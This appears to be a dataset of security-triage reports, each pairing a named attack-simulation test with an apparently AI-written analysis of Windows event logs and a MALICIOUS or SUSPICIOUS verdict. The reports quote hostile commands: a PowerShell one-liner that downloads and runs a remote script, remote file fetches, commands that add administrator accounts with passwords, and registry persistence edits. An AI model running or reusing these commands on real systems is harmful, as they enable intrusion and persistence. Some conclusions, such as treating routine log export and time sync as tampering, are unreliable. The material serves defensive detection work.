COM Hijacking with RunDLL32 (Local Server Switch),"Upon reviewing the Windows event logs provided from the Windows machine, the following observations have been made regarding potential indicators of malicious activity:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**  
   - A PowerShell script is executed with a command to manipulate the Windows Registry via `New-Item` and `New-ItemProperty` cmdlets. It attempts to create or modify registry keys under `HKCU\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}`. The script includes adding a `ThreadingModel` and executing `rundll32.exe` with a reference to a potentially malicious DLL (`data.015_calc.dll` located in a temporary directory).
   - The use of `rundll32.exe` to run a DLL file in this manner is a known technique for executing malicious code.

2. **DLL in Temporary Path:**  
   - The command includes a DLL referenced from a temporary directory, which is a common tactic used by malware to evade detection by antivirus tools, as legitimate programs typically do not execute DLLs from user temp directories.

3. **Use of `wevtutil.exe`:**  
   - Frequent execution of `wevtutil.exe` is observed, which can be used for manipulating event logs. This may indicate an attempt to cover tracks by clearing logs or exporting logs to ascertain what information is available in logs.

4. **High Integrity Level Execution:**
   - Processes are being executed with a high integrity level, indicating they have administrative privileges. Combined with the observed registry modifications and potential execution of arbitrary DLLs, this could be indicative of an attempt to achieve persistence or privilege escalation.

### Conclusions:

- Based on the observations, the activity recorded in these logs is highly suspicious and contains characteristics commonly associated with malicious behavior. Specifically, the execution of PowerShell commands that manipulate the registry, potential arbitrary DLL execution, and the use of audit log manipulation tools suggest malicious intent.
  
### Resolution:

- **MALICIOUS**: Given the nature of the PowerShell commands, registry alterations, and the execution of components in a manner consistent with known attack techniques, it is reasonable to conclude that the activity observed is malicious.

### Recommendations:

1. **Immediate Actions:**
   - Isolate the affected machine (Server002) from the network to prevent any potential spread of malicious activity.
   - Conduct a thorough sweep of the machine for malware, specifically looking for the identified DLLs and related artifacts.

2. **Log Analysis and Data Collection:**
   - Preserve all related logs for further forensic analysis.
   - Investigate any anomalous network traffic originating from the server, especially connections made by `rundll32.exe`.

3. **Security Posture Improvements:**
   - Review and enhance security policies related to PowerShell script execution.
   - Regularly audit and clear permissions for registry modification to prevent unauthorized access or changes.
   - Increase monitoring and alerting for use of tools like `wevtutil.exe` that can be used to cover up malicious activity.

By adhering to these recommendations, the organization can mitigate the risk and understand the extent of this incident while improving its overall security resilience."
IFEO Global Flags,"Upon analysis of the provided Windows event logs, I noted the following:

1. **Time Adjustments**:
   - The system log contains several time changes managed by `svchost.exe`, as evidenced by EventID 1 in the System log and EventID 4616 in the Security log. The changes appear to be consistent with routine time synchronization using `time.windows.com`. 
   - There is no evidence of manipulation or unauthorized alteration of time settings, suggesting this is typical system behavior.

2. **Process Executions**:
   - Processes like `wevtutil.exe`, `conhost.exe`, `hostnames.exe`, and `whoami.exe` have been executed by the user `admin_test`. 
   - These instances did not show any unusual command-line arguments or suspicious parent processes.

3. **Edge Update**:
   - Numerous entries in the Sysmon log indicate the presence of `MicrosoftEdgeUpdate.exe` executions. These instances suggest routine updates or installations of Microsoft Edge components.
   - The parent processes and accompanying file paths are consistent with legitimate Microsoft update practices.

4. **Registry Manipulations**:
   - There is a suspicious sequence related to the `cmd.exe` execution that involves several `REG ADD` commands targeting Notepad's execution options in the Windows Registry, which is typically indicative of an attempt to subvert standard program execution. 
   - These modifications are concerning as they could signal a persistence mechanism or attempt to hijack the Notepad process.

5. **Other Activities**:
   - The `svchost.exe` and `sppsvc.exe` processes run services like Windows Time and Software Protection Platform Service, which are integral to system function and do not show signs of abnormal behavior.
   - No signs of critical system modifications or privilege escalation activities were detected in these logs.

### Final Assessment:
Upon reviewing the sequence of events, especially focusing on the registry modifications tied to notepad's execution, this activity stands out as suspicious. While most activities are consistent with normal system operations, modifying registry settings for process handling (such as for `notepad.exe`) could indicate preparations for a persistence method or malware activity.

**Resolution**: SUSPICIOUS - The logs contain activity that deviates from standard operations, specifically registry modifications which need further investigation to ensure the system's integrity. It is advised to further investigate these registry modifications and inspect the system for potential infiltration or malware presence."
Bits download using desktopimgdownldr.exe (cmd),"Upon examining the provided Sysmon log entries, we identified several processes and activities that occurred on the Windows host. Let us assess potential signs of suspicious or malicious activity:

1. **Multiple executions of `wevtutil.exe` and `conhost.exe`:** 
   - `wevtutil.exe` is a legitimate utility in Windows used to manage event logs.
   - `conhost.exe` is a legitimate process, responsible for the command prompt's graphical interface.
   - Frequent execution of these processes in rapid succession could indicate scripted activity, but by themselves are not inherently malicious without additional context.

2. **Commands executed by `cmd.exe`:** 
   - The command `""cmd.exe"" /c set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/file/file-file/master/files/data/data.md /eventName:desktopimgdownldr` is suspicious.
   - It includes changing environment variables and downloading a file from a URL, which could potentially be used for downloading and executing malicious payloads.

3. **Execution of `desktopimgdownldr.exe`:**
   - The process `desktopimgdownldr.exe` is leveraged to download a file from the internet. Its usage for downloading content from an external URL, especially one hosted on GitHub, could indicate potential malicious behavior, albeit by itself, the process is not a known malicious file.

4. **Execution of system utilities like `whoami.exe` and `hostname.exe`:**
   - These utilities display information about the system and user identity but are often used by attackers in enumeration phases to gather information.

5. **Frequent execution of `MicrosoftEdgeUpdate.exe` processes:**
   - These processes appear to be related directly to Edge browser updates and are typically benign. However, frequent execution in a short time span is unusual unless a major update is being pushed.

Overall, the uncharacteristic execution of commands that include downloads from third-party URLs (GitHub in this case) can be indicative of potentially malicious activity and warrants further investigation. This includes verifying the legitimacy of the URL and the intention behind the downloaded content.

**Assessment and Resolution:**
- **Resolution:** **SUSPICIOUS**
- As there is evidence of potentially unwanted or unauthorized activities, particularly with the use of `cmd.exe` to set environment variables and download files, further investigation is warranted.
- **Recommendations:**
  - Confirm the legitimacy of the GitHub URL used for downloading via `cmd.exe`.
  - Review any recent changes or updates that may have initiated these actions.
  - Monitor for further unexpected changes in the environment.
  - Consider conducting a full system scan with updated antivirus definitions."
Set Arbitrary Binary as Screensaver,"Upon analyzing the provided Windows event logs from the machine ""Server002"", the following key observations and potential indicators of compromise were noted:

1. **Process Execution**: 
   - Multiple processes related to ""Microsoft Edge Update"" are observed, which is typical for software update operations. 
   - There is an execution of `whoami.exe`, `hostname.exe`, and several `conhost.exe` instances, which could relate to routine maintenance or troubleshooting tasks.

2. **Suspicious Command-Line Activity**:
   - A significant anomaly is observed with the execution of `cmd.exe` with command-line parameters that include exporting registry settings, copying `cmd.exe` to `evilscreensaver.scr`, and modifying registry settings to use this screensaver. This is suspicious and indicative of potential malicious behavior, as it attempts to establish persistence by setting a potentially malicious screensaver.
   
3. **Registry Modification**:
   - Multiple invocations of `reg.exe` were observed, which indicate modifications to the registry under `HKEY_CURRENT_USER\Control Panel\Desktop`. The registry alterations pertain to screen saver settings, enabling and setting a potentially malicious executable (`evilscreensaver.scr`) as the screen saver.
  
4. **Security Events**:
   - Logon events for the user account `admin_test` indicate a network logon session (`LogonType: 3`) using the NTLM protocol, which is a common remote access technique.
   - The presence of Event ID `4672` indicates that `admin_test` is granted a set of special privileges such as `SeDebugPrivilege` which could be used for malicious activities if the account is compromised.
   
Based on these observations, particularly the suspicious command-line operations and registry edits, the activities in the logs suggest a strong potential for malicious intent. The behavior witnessed (setting up a malicious screensaver, manipulating system settings) often correlates with activities conducted by malware or during an unauthorized take over of a system to gain persistence and control.

**Resolution: MALICIOUS**

**Guidance**: 
- The immediate next step is to isolate ""Server002"" from the network to prevent potential lateral movement or further compromise.
- Conduct a comprehensive forensic investigation on this system to identify how the malicious activity was initiated, check for the presence of known malware, and verify the integrity of the systems impacted.
- Review user account activities, especially focusing on the `admin_test` account access history, to assess any additional unauthorized actions.
- Assess the need to reset credentials or tighten access controls, particularly for administrative accounts.
- Enhance monitoring and logging to detect similar anomalies promptly in the future and consider deploying additional security mechanisms, like endpoint detection and response (EDR) tools."
Persistence using automatic execution of custom DLL during RDP session,"After reviewing the provided Windows event logs, several observations warrant attention regarding potential malicious activity:

### Key Observations:

1. **Privilege Assignment (Event ID 4672)**:
   - Multiple events show the user `admin_test` being granted special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege`, indicating this account is likely granted administrative capabilities. This is typical for service accounts or IT administrative users, but it stands out if `admin_test` is not a known account to hold such privileges or was recently created.

2. **Command Prompt Activity (Sysmon Event IDs 1 and 5)**:
   - The execution of `cmd.exe` with the command-line argument performing a registry alteration (`reg add`) is concerning as it modifies system settings. The registry key added pertains to Terminal Server AddIns, which could potentially be leveraged for persistence or malicious payload execution (DLL hijacking).

3. **Use of Standard Windows Utilities**:
   - Execution of `wevtutil.exe` and `conhost.exe` in multiple Sysmon logs, which might be normal depending on the context, but can be suspicious if used to alter logs or run shell processes, respectively, in this context particularly after the privilege escalation.

4. **Other Executions**: 
   - The execution of `whoami.exe` is often seen when a user or process is checking current logged-on user rights, possibly indicating recon activity post-compromise.
   - Microsoft Edge Update and Installation activities, which appear to be legitimate updates executed by the SYSTEM account, consistent with typical operation.

### Suspicious Patterns:
- **Registry Modification and Privilege Use**: The command to modify the registry under elevated privileges, potentially laying groundwork for deeper system compromise.
- **Consistent User and IP**: The user in all suspicious actions appears to be `SERVER002\admin_test` from a specific IP address (`fe80::e3b5:5371:12a8:9c77`), suggesting possible credential misuse or compromise.

### Assessment:
The activities captured in these logs, especially concerning the privilege escalation and registry modification executed through `cmd.exe`, are indicative of potential malicious activity, particularly if the `admin_test` account was not explicitly engaged in authorized administrative tasks at that time.

### Resolution: **MALICIOUS**
These logs contain evidence of potentially malicious activities, particularly due to the unauthorized privilege escalation, registry modification attempts, and command execution indicative of compromise. It is recommended to:
- Review the origin of the `admin_test` account activities and verify authorized use.
- Assess the registry changes made by the `cmd.exe` process.
- Investigate the IP address and source workstation for anomalies or unauthorized access patterns.
- Escalate to the incident response team to contain and mitigate the potential threat."
Create a new Windows admin user via .NET,"Based on my analysis of the provided Windows event logs, I've identified several indicators of potential malicious activity that are worth discussing:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a potentially harmful script. The command `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}` is suspicious because it downloads and executes a PowerShell script from an external source. This script appears to be designed to create a new local administrator account, which is a common tactic used by attackers to maintain persistence on a compromised system.

2. **Time Manipulation:**
   - The logs indicate changes to the system time. The `EventID 1` from the Kernel-General provider and `EventID 4616` from the Security-Auditing provider show modifications to the system time by the `svchost.exe` process. Time manipulation can be a technique used to hinder log analysis or synchronize with a malicious actor's timeline.

3. **Account Manipulation:**
   - Multiple events (e.g., `EventID 4720`, `4722`) show the creation and enabling of a user account named `NewLocalUser`, followed by elevation to an administrative group (EventID 4732). This activity, especially in conjunction with the PowerShell command, strongly suggests unauthorized account creation for the purpose of elevated access.

4. **Privilege Activity:**
   - There are events indicating the granting of high-level privileges, such as `SeDebugPrivilege`, which is a privilege often sought by attackers to escalate further attacks.

5. **Use of High-Integrity Processes:**
   - The Sysmon logs show multiple executions of high-integrity level processes initiated by the `admin_test` user, which aligns with the suspicious account and script activity.

In conclusion, the combination of risky PowerShell usage, time manipulation, creation and permission elevation of user accounts, and privilege modifications are strong indicators of malicious behavior. Therefore, the resolution for these logs is:

**Resolution: MALICIOUS**

**Guidance:**
- Immediate investigation and containment actions are recommended.
- Verify the integrity and origin of the PowerShell script and any accounts or scripts mentioned.
- Review any network activity and external connections around the time of suspicious events.
- Implement enhanced monitoring and consider isolating the affected host.
- Conduct a thorough audit and reset of all administrative accounts for security postures."
Create a new Windows admin user,"Based on the provided logs, there are several indicators that suggest potentially malicious activity. Here is a detailed analysis of the suspicious activities:

### Suspicious Activities:

1. **Creation of a New User with Elevated Privileges:**
   - **Sysmon Log Event ID 1/5:** Within moments, there are commands executed by `cmd.exe` which include the following: `net user /add ""data.001_Admin"" ""data_pass""` and `net localgroup administrators ""data.001_Admin"" /add`. This indicates a user with elevated privileges (`Administrator`) is being created.
   - **Security Log Event IDs 4720, 4732:** These events confirm the addition of a new user (`data.001_Admin`) and their membership to the `Administrators` group, correlated with the user `admin_test`.

2. **Suspicious Command Execution:**
   - The commands executed appear to be run from a high integrity context, executed by `admin_test` which suggests either privilege escalation or misuse of an existing privileged account.

3. **Lack of Legitimate Context for User Addition:**
   - There is no legitimate system action or update (except for regular Microsoft Defender updates) that typically involves the addition of new user accounts with such elevated privileges within the log timeline.

4. **System Integrity and Logging Context:**
   - Events such as `whoami.exe` and `hostname.exe` can be seen in a benign context but may also indicate a reconnaissance step in a malicious activity chain, attempting to verify system identity or user permissions.

5. **Exactly Timed and Fast Execution:**
   - The sequence of events, especially the creation and modification commands and their rapid, automated execution, often reflect scripted or automated attack techniques.

### Assessment:

The cumulative evidence of the creation of a new privileged user account, confirmed by both `cmd.exe` executions and subsequent security logs, alongside the rapid execution of commands without clear administrative context or logs indicating a sanctioned maintenance activity, suggests that this activity is not benign.

### Threats or Risks Identified:
- Creation of unauthorized accounts with elevated privileges poses a significant security risk, including potential for further exploitation, data breaches, or lateral movement within the network.

### Guidance:
- **Immediate Response:**
  - Disable or delete the user account `data.001_Admin`.
  - Investigate the context and origin of actions carried out by the `admin_test` account. Ensure the credentials involved are secured or changed.
  - Review user activity logs related to `admin_test` for further anomalies.
  - Implement monitoring for similar command executions to prevent repeat occurrences.

- **Long-term Measures:**
  - Strengthen monitoring of privileged account activities.
  - Consider implementing Just-In-Time (JIT) and Just-Enough-Administration (JEA) policies.
  - Regularly audit and update system defenses, ensuring event logs capture all relevant data for timely detection of irregular activities.

### Resolution
Based on the analysis, the resolution for this investigation is: **MALICIOUS**."
Create a new Domain Account using PowerShell,"### Detailed Analysis of Windows Event Logs

Upon examining the provided logs for the Windows host `Server002`, there are several observations and potential indicators of malicious activity detected. Below, I have categorized the events based on the logs provided:

#### Key Observations:

1. **Suspicious PowerShell Activity**:
   - There is an event where `powershell.exe` was executed with command-line arguments that indicate an attempt to manipulate Active Directory accounts. The command uses `Add-Type -AssemblyName System.DirectoryServices.AccountManagement` to access directory services, which is typically suspicious if not part of a standard administrative task.
   - The PowerShell script attempts to create or modify the credentials of a user named `data.002_Admin` with a password `data_pass123!`. This activity suggests potential unauthorized account creation or privilege escalation attempts.

2. **Use of System-Level Processes**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were launched. While these processes can be legitimate, when spawned in conjunction with other suspicious activities like unusual PowerShell executions, it can be indicative of log clearing attempts or dumping logs for information extraction.

3. **Pattern of `whoami` and `hostname` Executions**:
   - `whoami.exe` and `hostname.exe` were executed, potentially as part of reconnaissance activities to gather information about the current user context and the host system's network identity.

4. **Service and Process Anomalies**:
   - `MusNotification.exe`, which is related to Windows Update notifications, was executed without any parent process. While not inherently malicious, the context should be considered depending on whether this activity aligns with expected updates scheduled by IT policies.

#### Conclusion:

- **Malicious Activity Detected**:
  The specific PowerShell activity aimed at manipulating Active Directory accounts strongly suggests malicious intent. Account creation or modification via PowerShell with stored or hardcoded credentials is typically used to maintain persistence or escalate privileges in the system.

- **Resolution: MALICIOUS**:
  Based on the observations, the presence of suspicious PowerShell scripts attempting to manipulate user credentials is a clear indicator of malicious activity. Given the critical nature of what was executed and the risks associated, this should be escalated immediately.

### Guidance on How to Proceed:

1. **Immediate Response Actions**:
   - Lock or disable the `data.002_Admin` account and any other accounts suspiciously created or modified.
   - Investigate all accounts that have anomalous activity around the timestamp of PowerShell execution for potential compromise or misuse.

2. **Containment and Mitigation**:
   - Isolate the affected host, `Server002`, from the network until a thorough forensic analysis is completed.
   - Review firewall logs and network communications for data exfiltration attempts.

3. **Further Investigation**:
   - Conduct a full audit of administrator actions during the timeframe these events took place.
   - Analyze other systems in the network for similar indicators of compromise, as attackers could have expanded their attack vectors.

4. **Enhance Monitoring and Detection**:
   - Implement stricter monitoring of PowerShell execution, especially those that involve credential and account management.
   - Deploy advanced endpoint protection solutions that can identify and block such illegal PowerShell scripts in real-time.

This analysis highlights the importance of continuous monitoring and swift action in the event of suspicious activities within the network environment."
Install Additional Authentication Packages,"After reviewing the provided event logs from the Windows host on Server002, I have identified the following points of interest that require further analysis regarding potential indicators of malicious activity:

1. **PowerShell Execution**: There is an instance of a PowerShell command that manipulates the Windows Registry, specifically targeting the ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" key. The script attempts to export this registry key and copy a DLL (`filePWFilter.dll`) into the `C:\Windows\System32\` directory, then modifies the ""Authentication Packages"" value to include this DLL. This behavior is consistent with actions typically seen in credential theft or persistence mechanisms, as attackers often attempt to plant malicious DLLs to intercept authentication processes.

2. **Privileged Execution**: The PowerShell operation runs with high integrity, indicating it was executed with elevated privileges (""High"" integrity level). This suggests an attacker might have gained elevated access to execute potentially harmful actions.

3. **Suspicious Process Activities**: There are multiple instances of process creation events involving legitimate binaries like `powershell.exe`, `wevtutil.exe`, and `reg.exe`, which could be indicative of an attempt to hide malicious activities amongst benign processes or commonly used administrative tools in what's commonly known as living-off-the-land techniques.

4. **Process Parentage**: The parent process for the suspicious PowerShell activity is `wsmprovhost.exe`, which is a legitimate process for Windows Remote Management, but could indicate potentially malicious or unauthorized remote management activity if involved in such suspicious actions.

5. **Changes in System Time**: Several logs indicate the system time being adjusted. While not inherently malicious, time changes can be used to manipulate logs or the behavior of time-sensitive security mechanisms.

Given the evidence and findings outlined, the activities identified in these logs align with tactics often used in targeted attacks. The manipulation of the registry for LSA keys and incorporation of potentially unauthorized DLLs into the authentication process are especially concerning indicators, suggesting a compromise aimed at long-term persistence or credential harvesting.

### Assessment and Resolution:
**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the potentially compromised system, SERVER002, from the network to prevent further propagation or data exfiltration.

2. **Further Forensic Analysis**: Conduct a full forensic analysis of SERVER002, focusing on the execution context of the suspect PowerShell scripts and the origin of the unauthorized DLL. Analyze the integrity and authenticity of sensitive registry keys and system files modified.

3. **Review and Audit Privilege Access**: Audit and review any privilege access or escalation events. Ensure that the credentials used in executing the suspicious commands are valid and accounted for.

4. **Monitoring and Logging Enhancement**: Enable enhanced logging for PowerShell activities and critical Windows events to better detect and respond to unusual activities in the future.

5. **Patch and Update**: Ensure the system is fully patched and updated with the latest security patches to mitigate known vulnerabilities.

6. **Communication with Affected Users**: Inform and guide users about potential security threats and enforce password changes across the network, especially for privileged accounts. 

By following these measures, we can limit the potential impact and mitigate future occurrences of similar incidents."
Azure AD - Create a new user via Azure CLI,"Upon analyzing the provided Windows event logs, I've observed certain activities that raise concerns and warrant further examination:

1. **Time Adjustment Events:**
   - There are multiple Kernel-General event logs that show time changes performed by ""svchost.exe"". These changes are minor and typical of normal system adjustments or reflection of time updates synchronized with an NTP server. However, as this activity is noted repeatedly and precisely, it's prudent to consider it in the broader context of the other activities found.

2. **PowerShell Execution:**
   - Within the Windows PowerShell log, there are instances of PowerShell being executed with a command that includes Azure Active Directory (Azure AD) operations:
     - The script involves authenticating with Azure (`az login`) and creating a new user in Azure AD using a command line with uncharacteristically long credential (`reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg`).
     - This activity appears suspicious because it involves creating an Azure AD user account, possibly using a script in a sensitive context. This could potentially threaten the organization if not intended or authorized since it involves credential management and access to Azure resources.

3. **Process Creation Logged by Sysmon:**
   - The Sysmon logs indicate multiple instances of different processes like `svchost.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe`. These, by themselves, are not unusual, and the association with known Microsoft tools suggests legitimate actions. However, the detailed command lines along with the user ""SERVER002\\admin_test"" operating these could indicate script-based activities.

4. **Exporting Event Logs:**
   - The process `wevtutil.exe` is used to export logs (specific command: `wevtutil.exe epl Microsoft-Windows-Sysmon/Operational`). The context of exporting these logs, if not sanctioned, could imply an attempt to analyze system activities externally or even exfiltrate data.

5. **Network and System Processes:**
   - `sppsvc.exe` (Software Protection Service) and Edge-related updates suggest typical system maintenance activities.
   
Given the series of events, the activity involving PowerShell and Azure AD user creation scripts is the most concerning. If this was unintended or unauthorized, it could directly point towards potentially malicious behavior.

**Resolution: SUSPICIOUS**
- The presence of Azure Active Directory operations, particularly unauthorized account creation and credential handling, needs immediate verification with relevant personnel.
- There should be a follow-up investigation into who initiated these commands and their purpose, validated against Access Management logs or Azure audit logs if available.
- Additionally, confirming with the system administrators whether the time changes and event log exports were routine or intended can help rule out any malicious intent.

Further actions should aim to confirm or dispel malicious activity, ensuring no unauthorized access or changes were made within the organization's sensitive digital environments."
Modify Terminal Services DLL Path,"Upon analyzing the provided Windows event logs, several indicators of potential malicious activity are observed:

1. **Suspicious PowerShell Activity (Security logs and Windows PowerShell logs):**
   - Events indicate a PowerShell script executed with the aim of modifying the security permissions of `termsrv.dll`, part of Windows' Terminal Services, by granting ""FullControl"" to ""Administrators"". This is not standard behavior and can be associated with attempts to bypass security controls or enable Remote Desktop Protocol (RDP) without restrictions.
   - The script further indicates the copying of `termsrv.dll` to a new file (`fileTest.dll`) in a user's directory, and a subsequent registry modification to redirect a service to the new .dll, indicating potential persistence or further alteration of system functionalities.

2. **Privilege Escalation (Security log):**
   - The PowerShell script executed under the user `admin_test` with a high integrity level, suggesting administrative privileges. This execution context indicates possible privilege escalation actions, especially given the modification of critical system files and registry entries.

3. **Sysmon logs:**
   - Multiple instances of `conhost.exe` and `wevtutil.exe` were spawned by `admin_test`. Such patterns, especially when tied to PowerShell scripts, can indicate attempts to evade detection or audit logs.

4. **Time Manipulation (System log):**
   - Time settings of the server (`Server002`) were altered slightly. This could suggest attempts to hinder log accuracy or for anti-forensics measures. However, the change is very minimal and may potentially be explained by legitimate system synchronization needs, but in the context of other findings, it remains suspect.

5. **Registry Manipulations (PowerShell logs):**
   - Scripted modification of critical registry paths related to service configurations (such as `ServiceDll` within the `TermService\Parameters` registry path) suggests attempts at persistence through rogue DLLs.

### Assessment:

Given these observations, the provided event logs contain significant indicators of malicious activity. The execution of potentially harmful PowerShell scripts to modify system files and registry settings confirms this.

### Resolution: **MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected host (`Server002`) to prevent further unauthorized access or system compromise.
   - Conduct a thorough forensic investigation to understand the full scope of the compromise.
   - Ensure logs are secure and backed up for detailed analysis.

2. **Remediation:**
   - Restore any altered files or settings to their original state.
   - Review and possibly reset user credentials for `admin_test` and any other possibly affected accounts.
   - Implement additional monitoring focusing on PowerShell and administrative activity.

3. **Prevention:**
   - Implement strict access control measures for the use of administrative privileges.
   - Enhance endpoint security measures to detect and mitigate unauthorized use of PowerShell scripts. 
   - Regularly audit and review security settings and event logs for unusual or unauthorized changes.

By addressing these actions, the risk of further malicious activity can be better managed and potentially thwarted in the future."
IFEO Add Debugger,"### Detailed Analysis of Logs:

**Application Log:**
- The log entries for the **edgeupdate** service stopping twice in a short period might suggest an issue with the service, but services stopping and starting are not inherently suspicious without further context.
- A log entry from the **Software Protection Platform Service** does not indicate any unusual activity.

**Sysmon Log:**
- There are several legitimate Windows processes being executed (e.g., `hostname.exe`, `whoami.exe`, `svchost.exe`), predominantly by the user `SERVER002\admin_test`. The execution of these processes in sequence can often reflect routine administrative tasks or system checks.

- **Suspicious Activity Detected:**
  - An event with `cmd.exe` running on a high integrity level and modifying registry settings associated with the image file execution options (IFEO) for `calc.exe`. This is a common technique for persistence or stealth where a benign executable is used as a debugger for another process for malicious purposes.

- The repeated instances of `MicrosoftEdgeUpdate.exe` and related setup executables are likely part of a legitimate update process for Microsoft Edge. The files are executed with the system integrity level by `NT AUTHORITY\SYSTEM`, which is typical for system processes.

- `svchost.exe` and other related processes are running normally without any unusual command-line arguments or paths.

**System Log:**
- Adjustments to system time noted in the logs do not inherently imply malicious activity, especially given the context of a network time protocol (NTP) service interacting with `time.windows.com`. This activity appears standard for keeping system time synchronized.

**Security Log:**
- No anomalous or suspicious user login activity detected in the provided logs. Time adjustments were noted, aligning with the system log entries.

### Assessment:
- **Suspicious Activity:** The execution of `cmd.exe` with a command to modify registry settings for `calc.exe` under the image file execution options is concerning. This is not typical for regular operations and resembles a persistence method often utilized by malware.
- **Overall Risk:** The registry modification by `cmd.exe` indicates potential malicious activity. The rest of the logs reflect standard system operations.

### Resolution:
- **Resolution:** **MALICIOUS**
- **Guidance:**
  1. **Immediate Actions:**
     - Isolate the affected machine (Server002) from the network to prevent further potential compromise.
     - Conduct a forensic analysis of the affected machine to investigate further changes and potential indicator of compromise (IOC).
  2. **Further Investigation Required:**
     - Review adjacent logs and telemetry for other signs of command-and-control (C2) communications or data exfiltration.
     - Check for other unusual or unauthorized account activities.
  3. **Containment and Eradication:**
     - Remove or correct malicious registry changes.
     - Conduct a malware scan and remove identified threats.
  4. **Recovery:**
     - Restore systems from a known good backup if necessary.
     - Validate the integrity and security of critical systems.
  5. **Prevent Future Incidents:**
     - Strengthen user awareness and education around security practices.
     - Enhance monitoring for similar suspicious activities to catch such actions quickly.

Taking these actions will help ensure that the risk is mitigated and prevent recurrence of similar incidents."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"Here's a detailed analysis of the provided Windows event logs, with a focus on identifying any suspicious or potentially malicious activities:

### Analyzed Log Entries:

1. **Sysmon Logs:**
   - Numerous events show standard utility executions (e.g., `hostname.exe`, `whoami.exe`). These are legitimate Windows binaries typically used for standard operations, like checking system hostname and current user information.
   - A notable instance is the PowerShell execution with a suspicious command:
     - `powershell.exe` command is used with a script that modifies the Windows Registry to set an AutoRun value: `AutoRun` set to `notepad.exe`. This can be indicative of persistence mechanisms often used in malware.
     - The PowerShell event's command is potentially malicious as it attempts to ensure that `notepad.exe` runs automatically upon system start or user login, which is a known persistence technique.
   - The logs do not indicate the presence of compromised binaries, given the standard hashes for system processes.

2. **PowerShell Logs:**
   - The PowerShell command matches the suspicious execution found in Sysmon logs. The script's intention is to create persistence, which typically indicates an unwanted change imposed by a threat actor.

3. **Security Logs:**
   - Events indicate granting of high privileges (SeDebugPrivilege, etc.) to user `admin_test`. While not inherently malicious, this could be part of privilege escalation if these privileges were not standard for this account.
   - Logon events show successful logins and elevated privileges, which, in context, might raise suspicion when combined with the suspicious PowerShell activity and registry changes.

4. **System and Application Logs:**
   - No direct indicators of compromise, though time changes are noticed. This is sometimes indicative of attempts to evade time-based detection mechanisms, but in isolation, isn't conclusively malicious.

### Assessment:
Based on the logs, there is no indication of directly executed malicious binaries or compromised system executables. However, the PowerShell execution script modifying the registry for AutoRun is a clear red flag, indicating potentially unauthorized changes with persistence intent.

### Conclusion:
- **Resolution:** **MALICIOUS**
- **Reasoning:** The PowerShell script intended to modify the registry for persistence is a common technique used in malware. Combined with elevated privileges noted within the logs, it suggests that there may be an active attempt to maintain access to the system undetected.

### Guidance:
1. **Immediate Action:**
   - Terminate the PowerShell process if still running.
   - Check and clean the registry key `HKCU:\Software\Microsoft\Command Processor\AutoRun` to remove unauthorized entries.
  
2. **Further Investigation:**
   - Investigate the origin and context of the PowerShell script execution. Determine if it was triggered by a scheduled task, startup script, or executed manually.
   - Review user account actions and access logs around the timeframe for any anomalies.
  
3. **Remediation:**
   - Conduct a full anti-malware scan of the system.
   - Ensure all systems patches and updates are applied to close any potential vulnerabilities used for executing such scripts.

4. **Monitoring:**
   - Implement more robust monitoring of PowerShell script execution and registry changes.
   - Employ stricter access controls and auditing for high-privilege accounts."
Create a new user in a command prompt,"Upon reviewing the provided Windows event logs, several patterns and activities deserve deeper analysis to determine any potential risk or threat vectors.

### Suspicious or Anomalous Behaviors:

1. **Time Manipulation:**
   - In both the Security and System event logs, there is evidence of a system time change. Specifically, two Event 4616 entries in the Security log and corresponding entries in the System log indicate that the system time was altered. Time manipulation can often signify an attempt to obfuscate malicious activity, such as altering logs or evasion of scheduled tasks. 

2. **Privilege Escalation and User Account Management:**
   - There is an Event ID 4672 indicating that an account 'admin_test' was granted a suite of powerful privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) at 12:56:05. Elevated privileges are often sought after for malicious purposes to perform unauthorized actions on a system.
   - Event ID 4720 shows a new user account ('data.001_CMD') being created with an Event ID 4722 indicating this account was enabled. The creation and immediate activation of user accounts without clear administrative justification could be a sign of malicious user creation for future access.
   - The command-line activity logged in the Sysmon events indicates that the command `cmd.exe /c net user /add ""data.001_CMD"" ""data.001_CMD!""` was used to add a new user. This aligns with the creation and management events previously noted and suggests a potential unauthorized administrative action.

3. **Process Execution Anomalies:**
   - Multiple executions of 'wevtutil.exe' and 'cmd.exe' by the 'admin_test' user during this timeframe, as seen in the Sysmon logs, could indicate log management commands were executed, possibly to modify or retrieve event logs post activity execution.
   - Execution of system commands like 'whoami.exe' and 'hostname.exe' without clear operational purpose during the same session might suggest reconnaissance activity to gather system and network information post-compromise.

### Malicious Activity Indicators:

- The simultaneous combination of privilege escalation, time manipulation, unauthorized user creation and alterations, and suspicious command execution strongly indicates a methodical attempt to compromise and retain control over the Windows system.

### Conclusion and Guidance:

**Resolution: MALICIOUS**

This investigation finds the logs contain activities that are highly indicative of a security compromise. Given the combination of privilege escalation, time change indicators, unauthorized user creation, and suspicious command execution, these actions suggest deliberate and unauthorized intrusion tactics, techniques, and procedures (TTPs) consistent with malicious attacker behavior.

### Next Steps:

1. **Immediate Containment:**
   - Disable the created account 'data.001_CMD' and any suspicious accounts that were activated without proper administrative control.
   - Confirm the time settings and rectify any discrepancies to retrieve accurate logging timestamps.

2. **Root Cause Analysis:**
   - Investigate the session linked with 'admin_test' thoroughly to pinpoint the initial access vector and discover if this user account was itself compromised.
   - Review and audit privilege assignments on the system to ensure no further unauthorized privileges are granted.

3. **System Hardening:**
   - Restrict and monitor the usage of sensitive privileges and commands through Group Policy or other central controls.
   - Enable tighter logging and anomaly detection, specifically for time changes and critical privilege usage.

4. **Restore and Recover:**
